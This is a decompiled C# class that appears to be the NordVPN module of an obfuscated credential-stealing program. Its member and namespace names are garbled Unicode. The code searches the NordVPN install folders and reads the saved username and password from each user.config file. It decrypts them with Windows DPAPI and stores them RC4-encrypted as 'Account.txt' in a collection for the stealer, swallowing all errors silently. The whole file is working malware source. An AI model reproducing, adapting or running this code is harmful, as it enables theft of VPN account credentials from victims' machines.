using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace \u030E\u0360\u0313\u034E\u0315\u0E47\u0020\u0305\u035C\u0351\u0E47\u0351\u0320\u0301\u036B\u0300zcryfxllszuahcty\u0347\u0334\u0342\u0E47\u0310\u032C\u0358\u0340\u036B\u0331\u0329\u036B\u0340\u032F\u0308\u0E47cexuwlosbhsreyjl
{
	// Token: 0x0200000B RID: 11
	internal class Class_7
	{
		// Token: 0x0600001B RID: 27 RVA: 0x00002ED4 File Offset: 0x000010D4
		public static void pmethod_9(string str_0)
		{
			try
			{
				if (Directory.Exists(Class_47.\u0349\u0308t\u0324\u0329\u0306\u033Ae\u0340\u0341\u036B\u0351\u0E47c\u0363\u0363xrkhflctjjgrafhq\u036A\u0E47\u0302\u0368\u0020\u032C\u035E\u0349\u0359\u0020\u0020\u0489\u0333\u030C\u0347\u032Cdfodarkersxinukm + "\\NordVPN\\"))
				{
					Directory.CreateDirectory(str_0 + Class_7.field_1);
					DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Class_47.\u0349\u0308t\u0324\u0329\u0306\u033Ae\u0340\u0341\u036B\u0351\u0E47c\u0363\u0363xrkhflctjjgrafhq\u036A\u0E47\u0302\u0368\u0020\u032C\u035E\u0349\u0359\u0020\u0020\u0489\u0333\u030C\u0347\u032Cdfodarkersxinukm, "NordVPN"));
					if (directoryInfo.Exists)
					{
						string text = "";
						DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
						for (int i = 0; i < directories.Length; i++)
						{
							foreach (DirectoryInfo directoryInfo2 in directories[i].GetDirectories())
							{
								text = text + "\tFound version " + directoryInfo2.Name + Environment.NewLine;
								string text2 = Path.Combine(directoryInfo2.FullName, "user.config");
								if (File.Exists(text2))
								{
									XmlDocument xmlDocument = new XmlDocument();
									xmlDocument.Load(text2);
									string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
									string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
									if (innerText != null && !string.IsNullOrEmpty(innerText))
									{
										text = text + "\t\tUsername: " + Class_7.smethod_10(innerText) + Environment.NewLine;
									}
									if (innerText2 != null && !string.IsNullOrEmpty(innerText2))
									{
										text = text + "\t\tPassword: " + Class_7.smethod_10(innerText2) + Environment.NewLine;
									}
									Class_7.field_0++;
								}
							}
						}
						Class_53.\u0347\u0020\u0328\u0020\u0369\u0E47h\u0364\u0358\u036D\u036B\u0324\u0322\u0E47\u031F\u0369qhgddlayjusqyuib\u0353c\u0347\u036Dr\u0020\u0E47\u0356\u0356\u0332\u036D\u0347\u0325\u030E\u0E47\u0356gugwsaxccacjclln.Add(str_0 + Class_7.field_1 + "\\Account.txt", Class_47.RC4(Encoding.UTF8.GetBytes(text)));
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600001C RID: 28 RVA: 0x000030B0 File Offset: 0x000012B0
		public static string smethod_10(string str_0)
		{
			string result;
			try
			{
				result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(str_0), null, DataProtectionScope.LocalMachine));
			}
			catch
			{
				result = "";
			}
			return result;
		}

		// Token: 0x04000024 RID: 36
		public static int field_0;

		// Token: 0x04000025 RID: 37
		public static string field_1 = "\\Vpn\\NordVPN";
	}
}
